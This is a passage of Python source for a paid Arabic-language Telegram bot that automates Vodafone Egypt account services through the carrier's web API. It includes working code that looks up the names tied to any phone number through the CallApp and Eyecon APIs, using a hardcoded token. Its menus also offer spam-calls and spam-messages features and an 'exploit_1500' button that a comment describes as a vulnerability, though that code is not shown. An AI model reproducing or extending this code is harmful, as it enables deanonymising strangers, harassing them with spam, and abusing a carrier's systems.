        'Sec-Fetch-Mode': "cors",
        'Sec-Fetch-Dest': "empty",
        'Referer': "https://web.vodafone.com.eg/spa/recharge"
    }

    try:
        response = requests.post(url, json=payload, headers=headers, timeout=30)
        if response.status_code == 200:
            return {"success": True, "message": "✅ تم شحن الرصيد بنجاح!"}
        else:
            try:
                error_data = response.json()
                code = error_data.get('code', 'غير معروف')
                reason = error_data.get('reason', 'حدث خطأ غير معروف')
                return {"success": False, "message": f"❌ فشل الشحن - الرمز: {code}\nالسبب: {reason}"}
            except:
                return {"success": False, "message": f"❌ فشل الشحن (كود {response.status_code})"}
    except Exception as e:
        return {"success": False, "message": f"❌ خطأ في الاتصال: {str(e)}"}

# ===== دوال الشحن الجديدة (معالج الخطوات) - تم تعديلها لاستخدام الدالة أعلاه =====
def run_charge_self(user_id, message_id):
    """بدء شحن للرقم المسجل"""
    session = get_user_session(user_id)
    if not session:
        # لا يمكن استخدام answer_callback_query هنا لأنه لا يوجد call object
        # نرسل رسالة عادية
        bot.send_message(user_id, "❌ يجب تسجيل الدخول أولاً!")
        return
    save_user_state(user_id, step="charge_waiting_for_card", action="charge_cards",
                   data={'target_number': session['number'], 'token': session['token'], 'msisdn': session['number']})
    bot.edit_message_text("💳 أرسل رقم الكارت (أرقام فقط):", user_id, message_id)

def run_charge_other(user_id, message_id):
    """بدء شحن لرقم آخر - نطلب الرقم أولاً"""
    save_user_state(user_id, step="charge_waiting_for_target", action="charge_cards",
                   data={})
    bot.edit_message_text("📱 أرسل رقم الهاتف المراد الشحن له (11 رقم يبدأ بـ 01):", user_id, message_id)

def run_charge_execute(user_id, message_id, target_number, card_number, token, msisdn):
    """تنفيذ الشحن باستخدام الدالة الجديدة"""
    result = recharge_card_with_token(user_id, token, msisdn, target_number, card_number)
    clear_user_state(user_id)
    try:
        bot.edit_message_text(result['message'], user_id, message_id)
    except:
        bot.send_message(user_id, result['message'])

# ===== دوال البحث عن الأرقام (تروكولر) =====
def search_phone_number(phone: str) -> str:
    """
    البحث عن اسم المتصل باستخدام CallApp و Eyecon
    """
    try:
        # تنظيف الرقم
        clean_number = re.sub(r'\D', '', phone)
        if not clean_number.startswith('01') or len(clean_number) != 11:
            return "❌ رقم غير صحيح! يجب أن يكون 11 رقم ويبدأ بـ 01."
        
        results = [f"🔍 نتائج البحث عن الرقم {phone}:\n"]
        
        # CallApp Search
        url1 = "https://s.callapp.com/callapp-server/csrch"
        params1 = {
            'cpn': f"+2{clean_number}", 
            'myp': "+201026701026",
            'ibs': "0", 
            'cid': "0", 
            'tk': "0007824515", 
            'cvc': "2204"
        }
        headers1 = {
            "User-Agent": "Mozilla/5.0 (Linux; Android 12)",
            "Connection": "Keep-Alive", 
            "Accept-Encoding": "gzip"
        }
        try:
            response1 = requests.get(url1, params=params1, headers=headers1, timeout=10)
            name1 = "غير متاح"
            if response1.status_code == 200:
                try:
                    data1 = response1.json()
                    name1 = data1.get("name", "غير متاح")
                except:
                    pass
            results.append(f"• الاسم (CallApp): {name1}")
        except:
            results.append("• CallApp: فشل في البحث")
        
        time.sleep(1)
        
        # Eyecon Search
        url2 = "https://api.eyecon-app.com/app/getnames.jsp"
        params2 = {
            'cli': f"2{clean_number}", 
            'lang': "en", 
            'is_callerid': "true",
            'is_ic': "true", 
            'cv': "vc_538_vn_4.0.538_a", 
            'requestApi': "URLconnection",
            'source': "SocialIdOptionSelectorDialog", 
            'is_search': "true"
        }
        headers2 = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; x64)",
            "Connection": "Keep-Alive", 
            "Accept": "application/json", 
            "Accept-Encoding": "gzip",
        }
        try:
            response2 = requests.get(url2, params=params2, headers=headers2, timeout=10)
            names = []
            if response2.status_code == 200:
                try:
                    data2 = response2.json()
                    if isinstance(data2, list):
                        names = [item.get("name", "مجهول") for item in data2 if item.get("name")]
                except:
                    pass
            if names:
                for idx, name in enumerate(names[:3], start=1):
                    results.append(f"• الاسم ({idx}) (Eyecon): {name}")
            else:
                results.append("• Eyecon: لا يوجد أسماء إضافية.")
        except:
            results.append("• Eyecon: فشل في البحث")
        
        results.append(f"\n📱 رابط الواتساب: https://wa.me/2{clean_number}")
        return "\n".join(results)
    except Exception as ex:
        return f"❌ خطأ غير متوقع: {ex}"

# ===== دوال التحقق من الاشتراك في القنوات =====
def check_channel_subscription(user_id):
    """التحقق من اشتراك المستخدم في جميع القنوات المطلوبة"""
    not_joined = []
    channels = get_required_channels()
    for channel in channels:
        try:
            chat_member = bot.get_chat_member(channel['username'], user_id)
            if chat_member.status in ['left', 'kicked']:
                not_joined.append(channel)
        except Exception as e:
            # إذا لم يكن البوت مشرفاً في القناة، نفترض أن المستخدم غير مشترك
            logger.warning(f"Cannot check channel {channel['username']}: {e}")
            not_joined.append(channel)
    return not_joined

def create_channels_join_keyboard():
    """إنشاء لوحة مفاتيح تحتوي على أزرار الانضمام للقنوات وزر التحقق"""
    markup = InlineKeyboardMarkup(row_width=1)
    channels = get_required_channels()
    for channel in channels:
        markup.add(InlineKeyboardButton(f"📢 انضم إلى {channel['name']}", url=channel['link']))
    markup.add(InlineKeyboardButton("🔄 تحقق من الاشتراك", callback_data="check_sub"))
    return markup

# تعديل دالة التحقق من الاشتراك (دمج الاشتراك في القنوات مع اشتراك الباقة)
def check_subscription(user_id):
    global CHECKING_SUBSCRIPTION
    
    if is_user_banned(user_id):
        return False, None, "🚫 لقد تم حظرك من استخدام البوت.", 0, None
    
    if user_id in ADMIN_IDS:
        return True, None, None, None, None
    
    # أولاً: التحقق من القنوات
    not_joined = check_channel_subscription(user_id)
    if not_joined:
        channels_list = "\n".join([f"• {ch['name']}" for ch in not_joined])
        caption = CHANNEL_SUB_REQUIRED_MESSAGE.format(channels_list=channels_list)
        markup = create_channels_join_keyboard()
        return False, markup, caption, 0, None
    
    # ثانياً: التحقق من الاشتراك المدفوع إذا كان مفعلاً
    require_sub = get_require_subscription_setting()
    if require_sub:
        if CHECKING_SUBSCRIPTION.get(user_id, False):
            time.sleep(1)
            if CHECKING_SUBSCRIPTION.get(user_id, False):
                return True, None, None, None, None
        
        try:
            CHECKING_SUBSCRIPTION[user_id] = True
            
            is_active, days_left, end_date = check_subscription_db(user_id)
            if not is_active:
                cash_number = get_vodafone_cash_number()
                developer_username = get_developer_username()
                caption = SUBSCRIPTION_EXPIRED_MESSAGE.format(cash_number=cash_number)
                markup = types.InlineKeyboardMarkup()
                markup.add(types.InlineKeyboardButton(get_button_name("contact_dev"), url=f"https://t.me/{developer_username[1:]}"))
                return False, markup, caption, days_left, end_date
            
            return True, None, None, days_left, end_date
        
        except Exception as e:
            logger.error(f"❌ خطأ في check_subscription للمستخدم {user_id}: {e}")
            return True, None, None, 0, None
        
        finally:
            if user_id in CHECKING_SUBSCRIPTION:
                del CHECKING_SUBSCRIPTION[user_id]
    
    return True, None, None, 0, None

# ===== نظام الاشتراك التلقائي الجديد (بدون تدخل المطور) - تم تحويله إلى نظام الموافقة اليدوية =====
# تم إزالة auto_subscribe واستبدالها بالدوال الجديدة أدناه.

def show_premium_plans(user_id, message_id=None):
    """عرض خطط الاشتراك المتاحة (أسبوعي/شهري)"""
    text = "💳 اختر خطة الاشتراك المناسبة لك:\n\n"
    text += f"• أسبوعي: {WEEKLY_PRICE} جنيه لمدة {WEEKLY_DAYS} أيام\n"
    text += f"• شهري: {MONTHLY_PRICE} جنيه لمدة {MONTHLY_DAYS} يوم\n\n"
    text += "اضغط على الخطة التي تريدها."
    
    markup = InlineKeyboardMarkup(row_width=2)
    markup.add(
        InlineKeyboardButton(f"أسبوعي ({WEEKLY_PRICE} جنيه)", callback_data="premium_plan_weekly"),
        InlineKeyboardButton(f"شهري ({MONTHLY_PRICE} جنيه)", callback_data="premium_plan_monthly")
    )
    
    if message_id:
        try:
            bot.edit_message_text(text, user_id, message_id, reply_markup=markup)
        except:
            bot.send_message(user_id, text, reply_markup=markup)
    else:
        bot.send_message(user_id, text, reply_markup=markup)

def start_premium_payment(user_id, message_id, plan):
    """بدء عملية الدفع بعد اختيار الخطة - تم تعديلها لتسمح بدون تسجيل دخول"""
    # إزالة التحقق من تسجيل الدخول
    cash_number = get_vodafone_cash_number()
    plan_text = f"أسبوعي ({WEEKLY_DAYS} أيام)" if plan == "weekly" else f"شهري ({MONTHLY_DAYS} يوم)"
    plan_price = WEEKLY_PRICE if plan == "weekly" else MONTHLY_PRICE
    
    text = f"""
💳 اشتراك مميز - {plan_text}

المبلغ المطلوب: {plan_price} جنيه

يرجى تحويل المبلغ إلى رقم فودافون كاش التالي:
📱 {cash_number}

بعد التحويل، أرسل الرقم الذي قمت بالتحويل منه (11 رقم يبدأ بـ 01).
ثم أرسل صورة التحويل كدليل.

⚠️ سيتم مراجعة طلبك من قبل المطور وسيتم تفعيل الاشتراك بعد الموافقة.
    """
    
    if message_id:
        try:
            bot.edit_message_text(text, user_id, message_id)
        except:
            bot.send_message(user_id, text)
    else:
        bot.send_message(user_id, text)
    
    save_user_state(user_id, step="auto_premium_waiting_transferred", action="premium_subscription",
                   data={'user_id': user_id, 'plan': plan})

def run_premium_subscription_start(user_id, message_id=None):
    """بدء عملية الاشتراك المميز مع عرض الخطط أولاً"""
    show_premium_plans(user_id, message_id)

# ===== إنشاء الـ Keyboard الرئيسي (مع مراعاة رؤية الأزرار وبدون زر الاشتراك المميز) =====
def create_main_keyboard_for_user(user_id):
    """إنشاء keyboard أساسي مع زر تسجيل دخول فقط للمستخدمين العاديين"""
    keyboard = ReplyKeyboardMarkup(resize_keyboard=True, row_width=1)
    btn = KeyboardButton(get_button_name("login"))
    btn_contact = KeyboardButton(get_button_name("contact_dev"))
    keyboard.add(btn, btn_contact)
    return keyboard

def create_main_keyboard_for_admin():
    """إنشاء keyboard أساسي للمالك مع زر لوحة التحكم"""
    keyboard = ReplyKeyboardMarkup(resize_keyboard=True, row_width=1)
    btn_login = KeyboardButton(get_button_name("login"))
    btn_admin = KeyboardButton("👑 لوحة التحكم")
    btn_contact = KeyboardButton(get_button_name("contact_dev"))
    keyboard.add(btn_login, btn_admin, btn_contact)
    return keyboard

def create_all_services_keyboard(user_id=None):
    """إنشاء keyboard واحد يحتوي على جميع الخدمات، مع مراعاة رؤية الأزرار لكل مستخدم (تم إزالة refresh_balance و premium_subscription و contact_dev)"""
    keyboard = ReplyKeyboardMarkup(resize_keyboard=True, row_width=2)
    
    # القائمة الرئيسية مقسمة لقوائم فرعية
    keyboard.row(
        KeyboardButton(get_button_name("menu_flex_management")),
        KeyboardButton(get_button_name("menu_line_management"))
    )
    keyboard.row(
        KeyboardButton(get_button_name("menu_internet")),
        KeyboardButton(get_button_name("menu_offers"))
    )
    keyboard.row(
        KeyboardButton(get_button_name("menu_other")),
        KeyboardButton(get_button_name("menu_nota"))
    )
    keyboard.row(KeyboardButton(get_button_name("logout")))
    
    return keyboard

def create_flex_260_keyboard():
    """قائمة خدمات فليكس 260 - صفحة منفصلة (مع زر القائمة السابقة بدلاً من رجوع)"""
    keyboard = ReplyKeyboardMarkup(resize_keyboard=True, row_width=2)
    
    buttons = [
        KeyboardButton(get_button_name("flex_percentage")),
        KeyboardButton(get_button_name("get_owner_number")),
        KeyboardButton(get_button_name("send_invitation")),
        KeyboardButton(get_button_name("accept_invitation")),
        KeyboardButton(get_button_name("delete_invitation")),
        KeyboardButton(get_button_name("change_quota")),
        KeyboardButton(get_button_name("send_and_accept")),
        KeyboardButton(get_button_name("family_details")),  # الزر الجديد
    ]
    
    for i in range(0, len(buttons), 2):
        if i + 1 < len(buttons):
            keyboard.row(buttons[i], buttons[i + 1])
        else:
            keyboard.row(buttons[i])
    
    # إضافة زر القائمة السابقة (نفس وظيفة الرجوع)
    keyboard.row(KeyboardButton(get_button_name("back")))
    
    return keyboard

def create_flex_management_keyboard():
    """قائمة إدارة فليكس"""
    keyboard = ReplyKeyboardMarkup(resize_keyboard=True, row_width=2)
    keyboard.row(
        KeyboardButton(get_button_name("flex_260")),
        KeyboardButton(get_button_name("flex_systems"))
    )
    keyboard.row(
        KeyboardButton(get_button_name("discount_offers")),
        KeyboardButton(get_button_name("balance_transfer"))
    )
    keyboard.row(
        KeyboardButton(get_button_name("flex_transfer")),
        KeyboardButton(get_button_name("add_family_member_4x4"))
    )
    keyboard.row(KeyboardButton(get_button_name("back")))
    return keyboard

def create_line_management_keyboard():
    """قائمة إدارة الخط والحساب"""
    keyboard = ReplyKeyboardMarkup(resize_keyboard=True, row_width=2)
    keyboard.row(
        KeyboardButton(get_button_name("call_history")),
        KeyboardButton(get_button_name("change_password"))
    )
    keyboard.row(
        KeyboardButton(get_button_name("suspend_line")),
        KeyboardButton(get_button_name("refund_money_back"))
    )
    keyboard.row(
        KeyboardButton(get_button_name("user_data")),
        KeyboardButton(get_button_name("stop_ads"))
    )
    keyboard.row(KeyboardButton(get_button_name("back")))
    return keyboard

def create_internet_menu_keyboard():
    """قائمة باقات الإنترنت"""
    keyboard = ReplyKeyboardMarkup(resize_keyboard=True, row_width=1)
    keyboard.row(KeyboardButton(get_button_name("internet_bundles")))
    keyboard.row(KeyboardButton(get_button_name("second_month_internet")))
    keyboard.row(KeyboardButton(get_button_name("renew_bundle")))
    keyboard.row(KeyboardButton(get_button_name("back")))
    return keyboard

def create_offers_menu_keyboard():
    """قائمة العروض والخصومات"""
    keyboard = ReplyKeyboardMarkup(resize_keyboard=True, row_width=2)
    keyboard.row(
        KeyboardButton(get_button_name("stop_ads")),
        KeyboardButton(get_button_name("get_offers"))
    )
    keyboard.row(
        KeyboardButton(get_button_name("discount_offers")),
        KeyboardButton(get_button_name("add_two_days"))
    )
    keyboard.row(
        KeyboardButton(get_button_name("charge_cards")),
        KeyboardButton(get_button_name("cards"))
    )
    keyboard.row(KeyboardButton(get_button_name("back")))
    return keyboard

def create_other_services_keyboard():
    """قائمة خدمات أخرى"""
    keyboard = ReplyKeyboardMarkup(resize_keyboard=True, row_width=2)
    keyboard.row(
        KeyboardButton(get_button_name("truecaller")),
        KeyboardButton(get_button_name("spam_messages"))
    )
    keyboard.row(
        KeyboardButton(get_button_name("spam_calls")),
        KeyboardButton(get_button_name("package_report"))
    )
    keyboard.row(KeyboardButton(get_button_name("vodafone_cash_no_tax")))
    keyboard.row(KeyboardButton(get_button_name("back")))
    return keyboard

def create_nota_menu_keyboard():
    """قائمة نوتة جميع الأنظمة"""
    keyboard = ReplyKeyboardMarkup(resize_keyboard=True, row_width=1)
    keyboard.row(KeyboardButton(get_button_name("check_nota_eligibility")))
    keyboard.row(KeyboardButton(get_button_name("activate_nota15")))
    keyboard.row(KeyboardButton(get_button_name("activate_nota40")))
    keyboard.row(KeyboardButton(get_button_name("back")))
    return keyboard


def create_balance_transfer_menu():
    """إنشاء قائمة تحويل الرصيد"""
    markup = InlineKeyboardMarkup(row_width=2)
    markup.add(
        InlineKeyboardButton("💰 تحويل رصيد جديد", callback_data="bt_new"),
        InlineKeyboardButton("📜 سجل التحويلات", callback_data="bt_history"),
        InlineKeyboardButton("🏠 الرئيسية", callback_data="services_section")
    )
    return markup

def create_admin_keyboard():
    """إنشاء keyboard لوحة تحكم المالك (تمت إزالة أزرار إدارة القنوات)"""
    keyboard = ReplyKeyboardMarkup(resize_keyboard=True, row_width=2)
    
    require_sub = get_require_subscription_setting()
    subscription_status = "🔒 تعطيل الاشتراك الإجباري" if require_sub else "🔓 تفعيل الاشتراك الإجباري"
    
    bot_status = "🛑 إيقاف البوت" if is_bot_running() else "▶️ تشغيل البوت"
    
    buttons = [
        KeyboardButton("👥 إضافة اشتراك"),
        KeyboardButton("🗑️ حذف أيام من اشتراك"),
        KeyboardButton("📊 استعلام عن اشتراك"),
        KeyboardButton("📋 قائمة المستخدمين"),
        KeyboardButton("✏️ تعديل اسم زر"),
        KeyboardButton("📝 عرض أسماء الأزرار"),
        KeyboardButton("📢 رسالة جماعية"),
        KeyboardButton("👁️ إظهار/إخفاء الأزرار"),
        KeyboardButton("📊 إحصائيات"),
        KeyboardButton("🚫 حظر مستخدم"),
        KeyboardButton("✅ إلغاء حظر"),
        KeyboardButton(subscription_status),
        KeyboardButton(bot_status),
        KeyboardButton("💳 تغيير رقم فودافون كاش"),
        KeyboardButton("➕ إضافة ادمن مساعد"),          # زر جديد
        KeyboardButton(get_button_name("remove_assistant_admin")),  # زر حذف ادمن مساعد
        KeyboardButton("🔄 تغير يوزر بوت تطير"),        # زر جديد
        KeyboardButton(get_button_name("manage_channels")),  # زر إدارة القنوات الإجبارية
        KeyboardButton(get_button_name("change_dev_username")),  # زر تغيير يوزر المطور
        KeyboardButton("🏠 الرئيسية")
    ]
    
    for i in range(0, len(buttons), 2):
        if i + 1 < len(buttons):
            keyboard.row(buttons[i], buttons[i + 1])
        else:
            keyboard.row(buttons[i])
    
    return keyboard

def create_main_buttons_keyboard():
    markup = types.InlineKeyboardMarkup(row_width=1)
    markup.add(
        types.InlineKeyboardButton(get_button_name("login"), callback_data="login_menu")
    )
    return markup

def create_main_menu_keyboard():
    markup = types.InlineKeyboardMarkup(row_width=2)
    
    # زر باقات الإنترنت (يعمل الآن)
    markup.add(
        types.InlineKeyboardButton(get_button_name("internet_bundles"), callback_data="internet_bundles_menu")
    )
    
    markup.add(
        types.InlineKeyboardButton(get_button_name("get_offers"), callback_data="get_offers_menu"),
        types.InlineKeyboardButton(get_button_name("cards"), callback_data="cards_categories")
    )
    
    markup.add(
        types.InlineKeyboardButton(get_button_name("suspend_line"), callback_data="suspend_line_menu"),
        types.InlineKeyboardButton(get_button_name("stop_ads"), callback_data="stop_ads_menu")
    )
    
    markup.add(
        types.InlineKeyboardButton(get_button_name("change_password"), callback_data="change_password_menu"),
        types.InlineKeyboardButton(get_button_name("package_report"), callback_data="package_report")
    )
    
    markup.add(
        types.InlineKeyboardButton(get_button_name("package_conversion"), callback_data="package_conversion_menu"),
        types.InlineKeyboardButton(get_button_name("refund_money_back"), callback_data="refund_money_back_menu")
    )
    
    markup.add(
        types.InlineKeyboardButton(get_button_name("add_two_days"), callback_data="add_two_days"),
        # تم إزالة types.InlineKeyboardButton(get_button_name("refresh_balance"), callback_data="refresh_balance")
    )
    
    markup.add(
        types.InlineKeyboardButton(get_button_name("logout"), callback_data="logout"),
        types.InlineKeyboardButton(get_button_name("flex_260"), callback_data="flex_260_menu")
    )
    
    markup.add(
        types.InlineKeyboardButton(get_button_name("discount_offers"), callback_data="discount_offers_menu"),
        types.InlineKeyboardButton(get_button_name("balance_transfer"), callback_data="balance_transfer_menu"),
        types.InlineKeyboardButton(get_button_name("flex_transfer"), callback_data="flex_transfer_menu"),
        types.InlineKeyboardButton(get_button_name("renew_bundle"), callback_data="renew_bundle_menu"),
        types.InlineKeyboardButton(get_button_name("flex_systems"), callback_data="flex_systems_menu"),  # زر أنظمة فليكس
        types.InlineKeyboardButton(get_button_name("home"), callback_data="services_section")
    )
    
    return markup

def create_stop_ads_menu():
    markup = InlineKeyboardMarkup(row_width=2)
    markup.add(
        InlineKeyboardButton("🎁 تفعيل 6 هدايا", callback_data="gifts_6"),
        InlineKeyboardButton(get_button_name("500_units"), callback_data="500_units_flow"),
        InlineKeyboardButton(get_button_name("exploit_1500"), callback_data="exploit_1500")  # الزر الجديد للثغرة
    )
    markup.add(InlineKeyboardButton("🏠 الرئيسية", callback_data="services_section"))
    return markup

def create_flex_260_menu():
    markup = types.InlineKeyboardMarkup(row_width=2)
    
    markup.add(
        types.InlineKeyboardButton(get_button_name("flex_percentage"), callback_data="check_flex_percentage"),
        types.InlineKeyboardButton(get_button_name("get_owner_number"), callback_data="check_owner_number")
    )
    
    markup.add(
        types.InlineKeyboardButton(get_button_name("send_invitation"), callback_data="send_invitation_menu"),
        types.InlineKeyboardButton(get_button_name("accept_invitation"), callback_data="accept_invitation_menu")
    )
    
    markup.add(
        types.InlineKeyboardButton(get_button_name("delete_invitation"), callback_data="delete_invitation_menu"),
        types.InlineKeyboardButton(get_button_name("change_quota"), callback_data="change_quota_menu")
    )
    
    markup.add(
        types.InlineKeyboardButton(get_button_name("send_and_accept"), callback_data="send_and_accept_menu"),
        types.InlineKeyboardButton(get_button_name("home"), callback_data="services_section")
    )
    
    return markup

def create_package_conversion_menu():
    markup = types.InlineKeyboardMarkup(row_width=2)
    
    packages_list = list(PACKAGES.items())
    
    for name, pkg_id in packages_list[:8]:
        markup.add(types.InlineKeyboardButton(text=name, callback_data=f"pkg_{pkg_id}"))
    
    if len(packages_list) > 8:
        markup.add(types.InlineKeyboardButton("➡️ الصفحة التالية", callback_data="packages_page_2"))
    
    markup.add(types.InlineKeyboardButton(get_button_name("home"), callback_data="services_section"))
    
    return markup

def create_packages_page2_menu():
    markup = types.InlineKeyboardMarkup(row_width=2)
    
    packages_list = list(PACKAGES.items())
    
    for name, pkg_id in packages_list[8:]:
        markup.add(types.InlineKeyboardButton(text=name, callback_data=f"pkg_{pkg_id}"))
    
    markup.add(
        types.InlineKeyboardButton("⬅️ الصفحة السابقة", callback_data="package_conversion_menu"),
        types.InlineKeyboardButton(get_button_name("home"), callback_data="services_section")
    )
    
    return markup

def create_money_back_offers_menu(offers):
    """إنشاء قائمة بأزرار الماني باك المتاحة - كل باقة في زر منفصل"""
    markup = types.InlineKeyboardMarkup(row_width=1)
    
    for i, offer in enumerate(offers):
        # اختصار الوصف الطويل
        desc = offer['description']
        if len(desc) > 50:
            desc = desc[:47] + "..."
        
        btn_text = f"💰 {offer['amount']} جنيه - {desc}"
        markup.add(types.InlineKeyboardButton(
            text=btn_text,
            callback_data=f"mb_refund_{i}"
        ))
    
    markup.add(types.InlineKeyboardButton("🏠 الرئيسية", callback_data="services_section"))
    
    return markup

def create_discount_offers_menu(offers):
    markup = types.InlineKeyboardMarkup(row_width=1)
    
    for i, offer in enumerate(offers[:10]):
        markup.add(types.InlineKeyboardButton(
            text=f"💰 {offer.get('clean_desc', 'عرض خصم')}",
            callback_data=f"discount_select_{i}"
        ))
    
    markup.add(types.InlineKeyboardButton("🏠 الرئيسية", callback_data="services_section"))
    
    return markup

# ===== قائمة جديدة للشحن (بدلاً من القديمة) =====
def create_charge_cards_menu():
    """إنشاء قائمة بسيطة لخدمة شحن الكروت"""
    markup = InlineKeyboardMarkup(row_width=2)
    markup.add(
        InlineKeyboardButton("💳 شحن لرقمي", callback_data="charge_self"),
        InlineKeyboardButton("📱 شحن لرقم آخر", callback_data="charge_other"),
        InlineKeyboardButton("🔙 رجوع", callback_data="services_section")
    )
    return markup

# ===== دوال الشحن الجديدة (معالج الخطوات) =====
# تم تعريف run_charge_self و run_charge_other أعلاه

def run_offers_auto_fetch(user_id, message_id, session):
    try:
        try:
            bot.edit_message_text("⏳ جاري تسجيل الدخول...", user_id, message_id)
        except:
            bot.send_message(user_id, "⏳ جاري تسجيل الدخول...")
        
        token = get_fresh_token(session['number'], session['password'])
        
        if not token or token.startswith("ERROR:"):
            try:
                bot.edit_message_text("❌ فشل تسجيل الدخول!", user_id, message_id)
            except:
                bot.send_message(user_id, "❌ فشل تسجيل الدخول!")
            return
            
        try:
            bot.edit_message_text("⏳ جاري جلب جميع العروض...", user_id, message_id)
        except:
            bot.send_message(user_id, "⏳ جاري جلب جميع العروض...")
        
        balance_response = get_balance_data(session['number'], token)
        
        if balance_response.status_code == 200:
            offers_data = balance_response.json()
            filtered_offers = filter_offers_by_type(offers_data, "all")
            
            if filtered_offers and len(filtered_offers) > 0:
                data = {
                    'number': session['number'],
                    'password': session['password'],
                    'token': token,
                    'offers': filtered_offers,
                    'current_offer': 0
                }
                
                save_user_state(user_id, step="offers_browsing", action="get_offers", data=data)
                
                run_show_offer(user_id, 0, message_id)
            else:
                try:
                    bot.edit_message_text("❌ لا توجد عروض متاحة.", user_id, message_id)
                except:
                    bot.send_message(user_id, "❌ لا توجد عروض متاحة.")
        else:
            try:
                bot.edit_message_text(f"❌ خطأ في السيرفر: {balance_response.status_code}.", user_id, message_id)
            except:
                bot.send_message(user_id, f"❌ خطأ في السيرفر: {balance_response.status_code}.")
            
    except Exception as e:
        try:
            bot.edit_message_text(f"❌ حدث خطأ غير متوقع: {str(e)}", user_id, message_id)
        except:
            bot.send_message(user_id, f"❌ حدث خطأ غير متوقع: {str(e)}")

def run_offers_fetch_flow(message, state, initial_message_id):
    user_id = message.chat.id
    number = state['number']
    password = state['password']
    filter_type = state.get('filter_type', 'all')
    
    filter_names = {
        "all": "جميع العروض",
        "internet": "عروض الإنترنت",
        "flex": "عروض الفليكس"
    }
    
    try:
        try:
            bot.edit_message_text(f"⏳ جاري تسجيل الدخول لـ {number}...", user_id, initial_message_id)
        except:
            bot.send_message(user_id, f"⏳ جاري تسجيل الدخول لـ {number}...")
        token = get_fresh_token(number, password)
        
        if not token or token.startswith("ERROR:"):
            try:
                bot.edit_message_text("❌ فشل تسجيل الدخول!", user_id, initial_message_id)
            except:
                bot.send_message(user_id, "❌ فشل تسجيل الدخول!")
            clear_user_state(user_id); return
            
        state['token'] = token
        
        try:
            bot.edit_message_text(f"⏳ جاري جلب {filter_names[filter_type]}...", user_id, initial_message_id)
        except:
            bot.send_message(user_id, f"⏳ جاري جلب {filter_names[filter_type]}...")
        balance_response = get_balance_data(number, token)
        
        if balance_response.status_code == 200:
            offers_data = balance_response.json()
            filtered_offers = filter_offers_by_type(offers_data, filter_type)
            
            if filtered_offers and len(filtered_offers) > 0:
                state['offers'] = filtered_offers
                state['current_offer'] = 0
                
                save_user_state(user_id, step="offers_browsing", action="get_offers", data=state)
                
                run_show_offer(user_id, 0, initial_message_id)
            else:
                try:
                    bot.edit_message_text(f"❌ لا توجد {filter_names[filter_type]} متاحة.", user_id, initial_message_id)
                except:
                    bot.send_message(user_id, f"❌ لا توجد {filter_names[filter_type]} متاحة.")
                clear_user_state(user_id); return
        else:
            try:
                bot.edit_message_text(f"❌ خطأ في السيرفر: {balance_response.status_code}.", user_id, initial_message_id)
            except:
                bot.send_message(user_id, f"❌ خطأ في السيرفر: {balance_response.status_code}.")
            clear_user_state(user_id); return
            
    except Exception as e:
        try:
            bot.edit_message_text(f"❌ حدث خطأ غير متوقع: {str(e)}", user_id, initial_message_id)
        except:
            bot.send_message(user_id, f"❌ حدث خطأ غير متوقع: {str(e)}")
        clear_user_state(user_id); return

def run_offers_refresh_flow(user_id, message_id):
    try:
        state = get_user_state(user_id)
        if not state or 'token' not in state.get('data', {}):
            try:
                bot.edit_message_text("❌ انتهت الجلسة!", user_id, message_id)
            except:
                bot.send_message(user_id, "❌ انتهت الجلسة!")
            return

        data = state['data']
        token = data['token']
        number = data['number']
        filter_type = data.get('filter_type', 'all')
        
        filter_names = {
            "all": "جميع العروض",
            "internet": "عروض الإنترنت",
            "flex": "عروض الفليكس"
        }
        
        try:
            bot.edit_message_text(f"⏳ جاري تحديث {filter_names[filter_type]}...", user_id, message_id)
        except:
            bot.send_message(user_id, f"⏳ جاري تحديث {filter_names[filter_type]}...")

        balance_response = get_balance_data(number, token)
        
        if balance_response.status_code == 200:
            offers_data = balance_response.json()
            filtered_offers = filter_offers_by_type(offers_data, filter_type)
            
            if filtered_offers and len(filtered_offers) > 0:
                data['offers'] = filtered_offers
                data['current_offer'] = 0
                
                save_user_state(user_id, step=state['step'], action=state['action'], data=data)
                
                run_show_offer(user_id, 0, message_id)
            else:
                try:
                    bot.edit_message_text(f"❌ لا توجد {filter_names[filter_type]} متاحة.", user_id, message_id)
                except:
                    bot.send_message(user_id, f"❌ لا توجد {filter_names[filter_type]} متاحة.")
                clear_user_state(user_id); return
        else:
            try:
                bot.edit_message_text("❌ انتهت الجلسة!", user_id, message_id)
            except:
                bot.send_message(user_id, "❌ انتهت الجلسة!")
            clear_user_state(user_id); return

    except Exception as e:
        try:
            bot.edit_message_text(f"❌ حدث خطأ أثناء التحديث: {str(e)}", user_id, message_id)
        except:
            bot.send_message(user_id, f"❌ حدث خطأ أثناء التحديث: {str(e)}")
        clear_user_state(user_id); return

def run_show_offer(user_id, offer_index, message_id):
    try:
        state = get_user_state(user_id)
        if not state or 'offers' not in state.get('data', {}):
            bot.send_message(user_id, "❌ لا توجد عروض!")
            return
            
        data = state['data']
        offers = data['offers']
        
        if offer_index < 0:
            offer_index = 0
        if offer_index >= len(offers):
            offer_index = len(offers) - 1
            
        current_offer = offers[offer_index]
        data['current_offer'] = offer_index
        
        save_user_state(user_id, step=state['step'], action=state['action'], data=data)
        
        offer_text = format_single_offer(current_offer, offer_index + 1, len(offers))
        keyboard = create_navigation_buttons(offer_index, len(offers))
        
        try:
            bot.edit_message_text(offer_text + "\n\nتصلي على سيدنا محمد ﷺ", user_id, message_id, reply_markup=keyboard)
        except telebot.apihelper.ApiTelegramException as e:
            if "message is not modified" not in str(e):
                bot.send_message(user_id, offer_text + "\n\nتصلي على سيدنا محمد ﷺ", reply_markup=keyboard)
            
    except Exception as e:
        bot.send_message(user_id, f"❌ خطأ في عرض العرض: {str(e)}")

def create_navigation_buttons(current_index, total_offers):
    keyboard = types.InlineKeyboardMarkup(row_width=3)
    
    buttons = []
    
    if current_index > 0:
        buttons.append(types.InlineKeyboardButton("◀️ السابق", callback_data=f"prev_{current_index-1}"))
    else:
        buttons.append(types.InlineKeyboardButton("◀️", callback_data="none"))
    
    buttons.append(types.InlineKeyboardButton(f"{current_index+1}/{total_offers}", callback_data="none"))
    
    if current_index < total_offers - 1:
        buttons.append(types.InlineKeyboardButton("التالي ▶️", callback_data=f"next_{current_index+1}"))
    else:
        buttons.append(types.InlineKeyboardButton("▶️", callback_data="none"))
    
    keyboard.add(*buttons)
    
    keyboard.add(types.InlineKeyboardButton("✅ اشتراك في العرض", callback_data=f"subscribe_{current_index}"))
    
    filter_buttons = [
        types.InlineKeyboardButton("🌐 الكل", callback_data="change_filter_all"),
